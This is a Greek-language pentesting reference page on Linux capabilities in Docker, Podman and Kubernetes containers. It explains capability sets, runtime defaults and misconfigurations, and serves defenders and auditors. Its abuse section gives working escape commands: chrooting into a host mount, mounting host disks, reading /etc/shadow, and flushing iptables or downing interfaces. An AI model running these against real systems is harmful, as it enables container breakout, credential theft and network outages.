# Linux Capabilities σε Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι Linux capabilities είναι ένα από τα πιο σημαντικά στοιχεία της ασφάλειας των containers γιατί απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά το "root" μέσα σε ένα container;** Σε ένα κανονικό σύστημα Linux, το UID 0 ιστορικά σήμαινε ένα πολύ ευρύ σύνολο προνομίων. Σε σύγχρονους πυρήνες, αυτό το προνόμιο διασπάται σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να τρέχει ως root και να της λείπουν ακόμα πολλές ισχυρές ενέργειες αν οι σχετικές capabilities έχουν αφαιρεθεί.

Τα containers εξαρτώνται σε μεγάλο βαθμό από αυτή τη διάκριση. Πολλά workloads εξακολουθούν να ξεκινούν ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς την αφαίρεση capabilities, αυτό θα ήταν πολύ επικίνδυνο. Με την αφαίρεση capabilities, μια διεργασία root μέσα στο container μπορεί να εκτελεί πολλές κοινές ενέργειες εντός container ενώ της απαγορεύονται πιο ευαίσθητες λειτουργίες του πυρήνα. Γι' αυτό ένα shell μέσα σε container που δείχνει `uid=0(root)` δεν σημαίνει αυτόματα "host root" ή ακόμη και "ευρεία προνόμια πυρήνα". Τα capability sets αποφασίζουν πόσο αξιόλογη είναι στην πραγματικότητα αυτή η ταυτότητα root.

Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα κατάχρησης, δείτε:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Λειτουργία

Οι capabilities παρακολουθούνται σε διάφορα σύνολα, όπως τα permitted, effective, inheritable, ambient και bounding sets. Για πολλές αξιολογήσεις container, η ακριβής σημασιολογία στον πυρήνα κάθε συνόλου είναι λιγότερο άμεσα σημαντική από το τελικό πρακτικό ερώτημα: **ποιες προνομιούχες ενέργειες μπορεί αυτή η διεργασία να εκτελέσει επιτυχώς τώρα, και ποιες μελλοντικές αποκτήσεις προνομίων είναι ακόμα πιθανές;**

Ο λόγος που αυτό έχει σημασία είναι ότι πολλές τεχνικές breakout είναι ουσιαστικά προβλήματα capabilities ντυμένα ως προβλήματα container. Ένα workload με `CAP_SYS_ADMIN` μπορεί να αποκτήσει τεράστια λειτουργικότητα του πυρήνα που μια κανονική διεργασία root σε container δεν θα έπρεπε να αγγίξει. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν μοιράζεται και το host network namespace. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να δει τις διεργασίες του host μέσω κοινής χρήσης PID του host. Σε Docker ή Podman αυτό μπορεί να εμφανιστεί ως `--pid=host`; σε Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.

Με άλλα λόγια, το σύνολο capabilities δεν μπορεί να αξιολογηθεί απομονωμένα. Πρέπει να διαβαστεί σε συνδυασμό με namespaces, seccomp και MAC policy.

## Εργαστήριο

Μια πολύ άμεση μέθοδος για να ελέγξετε τις capabilities μέσα σε ένα container είναι:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Μπορείτε επίσης να συγκρίνετε ένα πιο περιοριστικό container με ένα στο οποίο έχουν προστεθεί όλες οι capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Για να δείτε την επίδραση μιας στενής προσθήκης, δοκιμάστε να αφαιρέσετε τα πάντα και να προσθέσετε πίσω μόνο μία capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Αυτά τα μικρά πειράματα βοηθούν να φανεί ότι ένα runtime δεν απλώς εναλλάσσει ένα boolean που ονομάζεται "privileged". Διαμορφώνει την πραγματική επιφάνεια προνομίων που είναι διαθέσιμη στη διεργασία.

## Δυνατότητες Υψηλού Κινδύνου

Αν και πολλές capabilities μπορούν να έχουν σημασία ανάλογα με τον στόχο, μερικές είναι επανειλημμένα σχετικές στην ανάλυση container escape.

**`CAP_SYS_ADMIN`** είναι αυτή που οι αμυντικοί θα πρέπει να αντιμετωπίζουν με τη μεγαλύτερη δυσπιστία. Συχνά περιγράφεται ως "the new root" γιατί ξεκλειδώνει τεράστια λειτουργικότητα, συμπεριλαμβανομένων λειτουργιών σχετικών με mount, συμπεριφοράς ευαίσθητης σε namespace, και πολλών μονοπατιών στον kernel που δεν θα έπρεπε να εκτίθενται ελαφρά σε containers. Αν ένα container έχει `CAP_SYS_ADMIN`, αδύναμο seccomp και δεν έχει ισχυρή MAC confinement, πολλά κλασικά breakout paths γίνονται πολύ πιο ρεαλιστικά.

**`CAP_SYS_PTRACE`** έχει σημασία όταν υπάρχει ορατότητα διεργασιών, ειδικά αν το PID namespace μοιράζεται με το host ή με ενδιαφέρουσες γειτονικές workloads. Μπορεί να μετατρέψει την ορατότητα σε χειραγώγηση.

**`CAP_NET_ADMIN`** και **`CAP_NET_RAW`** έχουν σημασία σε περιβάλλοντα με επίκεντρο το δίκτυο. Σε ένα απομονωμένο bridge network μπορεί ήδη να είναι επικίνδυνες· σε ένα shared host network namespace είναι πολύ χειρότερες γιατί το workload μπορεί να επαναδιαμορφώσει το host networking, να sniff, να spoof, ή να παρεμβληθεί σε τοπικές ροές κίνησης.

**`CAP_SYS_MODULE`** είναι συνήθως καταστροφική σε ένα rootful περιβάλλον επειδή το φόρτωμα kernel modules ισοδυναμεί ουσιαστικά με έλεγχο του host-kernel. Σχεδόν ποτέ δεν θα έπρεπε να εμφανίζεται σε ένα γενικής χρήσης container workload.

## Χρήση στο runtime

Docker, Podman, containerd-based stacks, και CRI-O χρησιμοποιούν controls για capabilities, αλλά τα defaults και τα management interfaces διαφέρουν. Το Docker τα εκθέτει πολύ άμεσα μέσω flags όπως `--cap-drop` και `--cap-add`. Το Podman εκθέτει παρόμοιους ελέγχους και συχνά ωφελείται από rootless execution ως πρόσθετο επίπεδο ασφάλειας. Το Kubernetes εμφανίζει προσθήκες και drops capabilities μέσω του Pod ή container `securityContext`. Περιβάλλοντα system-container όπως τα LXC/Incus επίσης βασίζονται σε capability control, αλλά η ευρύτερη ενσωμάτωση με το host σε αυτά τα συστήματα συχνά παρακινεί τους χειριστές να χαλαρώνουν τα defaults πιο επιθετικά απ’ ό,τι θα έκαναν σε ένα app-container περιβάλλον.

Η ίδια αρχή ισχύει σε όλα: μια capability που τεχνικά είναι δυνατό να χορηγηθεί δεν είναι απαραίτητα κάτι που πρέπει να χορηγηθεί. Πολλά πραγματικά περιστατικά ξεκινούν όταν ένας operator προσθέτει μια capability απλώς επειδή ένα workload απέτυχε υπό πιο αυστηρή διαμόρφωση και η ομάδα χρειάστηκε μια γρήγορη λύση.

## Λανθασμένες ρυθμίσεις

Το πιο προφανές λάθος είναι **`--cap-add=ALL`** στις Docker/Podman-style CLIs, αλλά δεν είναι το μόνο. Στην πράξη, πιο συνηθισμένο πρόβλημα είναι η χορήγηση μιας ή δύο εξαιρετικά ισχυρών capabilities, ειδικά της `CAP_SYS_ADMIN`, για να "λειτουργήσει η εφαρμογή" χωρίς να κατανοηθούν και οι επιπτώσεις στα namespace, seccomp, και mount. Ένας άλλος κοινός τρόπος αποτυχίας είναι ο συνδυασμός επιπλέον capabilities με το sharing host namespaces. Στο Docker ή Podman αυτό μπορεί να εμφανιστεί ως `--pid=host`, `--network=host`, ή `--userns=host`; στο Kubernetes το αντίστοιχο exposure συνήθως εμφανίζεται μέσω ρυθμίσεων workload όπως `hostPID: true` ή `hostNetwork: true`. Κάθε ένας από αυτούς τους συνδυασμούς αλλάζει το τι μπορεί πραγματικά να επηρεάσει η capability.

Επίσης είναι συνηθισμένο οι διαχειριστές να πιστεύουν ότι επειδή ένα workload δεν είναι πλήρως `--privileged`, εξακολουθεί να είναι ουσιαστικά περιορισμένο. Κάποιες φορές αυτό ισχύει, αλλά κάποιες φορές η πραγματική στάση είναι ήδη αρκετά κοντά στο privileged ώστε η διάκριση να παύει να έχει λειτουργική σημασία.

## Κατάχρηση

Το πρώτο πρακτικό βήμα είναι να απαριθμήσετε το σύνολο των αποτελεσματικών capabilities και να δοκιμάσετε αμέσως τις capability-specific ενέργειες που θα είχαν σημασία για escape ή πρόσβαση σε πληροφορίες του host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Αν υπάρχει το `CAP_SYS_ADMIN`, δοκίμασε πρώτα καταχρήσεις μέσω mount και πρόσβαση στο filesystem του host, επειδή αυτός είναι ένας από τους πιο συνηθισμένους παράγοντες που επιτρέπουν breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Εάν το `CAP_SYS_PTRACE` υπάρχει και το container μπορεί να δει ενδιαφέρουσες διεργασίες, επαληθεύστε εάν η δυνατότητα μπορεί να μετατραπεί σε επιθεώρηση διεργασιών:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Εάν το `CAP_NET_ADMIN` ή το `CAP_NET_RAW` είναι παρόν, ελέγξτε αν το workload μπορεί να χειριστεί την ορατή στοίβα δικτύου ή τουλάχιστον να συλλέξει χρήσιμες πληροφορίες δικτύου:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Όταν ένα capability test επιτύχει, συνδύασέ το με την κατάσταση του namespace. Μια capability που φαίνεται απλώς επικίνδυνη σε ένα απομονωμένο namespace μπορεί αμέσως να γίνει ένα escape ή host-recon primitive όταν το container επίσης μοιράζεται host PID, host network, ή host mounts.

### Πλήρες Παράδειγμα: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Αν το container έχει `CAP_SYS_ADMIN` και ένα εγγράψιμο bind mount του host filesystem όπως `/host`, το escape path είναι συχνά απλό:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Αν το `chroot` επιτύχει, οι εντολές πλέον εκτελούνται στο πλαίσιο του root filesystem του host:
```bash
id
hostname
cat /etc/shadow | head
```
Εάν το `chroot` δεν είναι διαθέσιμο, το ίδιο αποτέλεσμα μπορεί συχνά να επιτευχθεί καλώντας το binary μέσω του mounted tree:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Πλήρες Παράδειγμα: `CAP_SYS_ADMIN` + Πρόσβαση σε Συσκευή

Εάν μια block device του host εκτεθεί, το `CAP_SYS_ADMIN` μπορεί να την μετατρέψει σε άμεση πρόσβαση στο filesystem του host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Πλήρες Παράδειγμα: `CAP_NET_ADMIN` + Δικτύωση οικοδεσπότη

Αυτός ο συνδυασμός δεν παράγει πάντα άμεσα host root, αλλά μπορεί να αναδιαμορφώσει πλήρως τη δικτυακή στοίβα του οικοδεσπότη:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό μπορεί να επιτρέψει denial of service, traffic interception ή πρόσβαση σε υπηρεσίες που προηγουμένως φιλτράρονταν.

## Έλεγχοι

Ο στόχος των ελέγχων δυνατοτήτων δεν είναι μόνο να καταγράψουν τις ακατέργαστες τιμές αλλά να κατανοήσουν εάν η διεργασία διαθέτει αρκετά προνόμια ώστε να καταστήσει επικίνδυνη την τρέχουσα κατάσταση του χώρου ονομάτων (namespace) και των σημείων προσάρτησης (mount).
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Τι είναι ενδιαφέρον εδώ:

- `capsh --print` είναι ο πιο εύκολος τρόπος για να εντοπίσετε capabilities υψηλού κινδύνου όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ή `cap_sys_module`.
- Η γραμμή `CapEff` στο `/proc/self/status` σας λέει τι είναι πραγματικά ενεργό τώρα, όχι μόνο τι μπορεί να είναι διαθέσιμο σε άλλα σύνολα.
- Ένα capability dump γίνεται πολύ πιο σημαντικό αν το container επίσης μοιράζεται host PID, network ή user namespaces, ή έχει εγγράψιμα host mounts.

Μετά τη συλλογή των raw capability πληροφοριών, το επόμενο βήμα είναι η ερμηνεία. Ελέγξτε αν η διεργασία είναι root, αν τα user namespaces είναι ενεργά, αν τα host namespaces μοιράζονται, αν το seccomp είναι σε enforcing κατάσταση, και αν AppArmor ή SELinux περιορίζουν ακόμα τη διεργασία. Ένα capability set από μόνο του είναι μόνο μέρος της εικόνας, αλλά συχνά είναι το κομμάτι που εξηγεί γιατί ένα container breakout λειτουργεί και ένα άλλο αποτυγχάνει με το ίδιο φαινομενικό σημείο εκκίνησης.

## Προεπιλογές χρόνου εκτέλεσης

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Το Docker διατηρεί μια προεπιλεγμένη λίστα επιτρεπόμενων capabilities και αφαιρεί τα υπόλοιπα | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Τα Podman containers δεν έχουν προνόμια από προεπιλογή και χρησιμοποιούν ένα μειωμένο μοντέλο capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | Αν δεν καθοριστεί `securityContext.capabilities`, το container παίρνει το προεπιλεγμένο σύνολο capabilities από το runtime | `securityContext.capabilities.add`, μη εκτέλεση του `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | Το αποτελεσματικό σύνολο εξαρτάται από το runtime μαζί με το Pod spec | ίδιο με τη γραμμή Kubernetes; η άμεση διαμόρφωση OCI/CRI μπορεί επίσης να προσθέσει capabilities ρητώς |

Για το Kubernetes, το σημαντικό σημείο είναι ότι το API δεν ορίζει ένα καθολικό προεπιλεγμένο σύνολο capabilities. Αν το Pod δεν προσθέτει ή δεν αφαιρεί capabilities, το workload κληρονομεί το runtime default για αυτόν τον node.
{{#include ../../../../banners/hacktricks-training.md}}
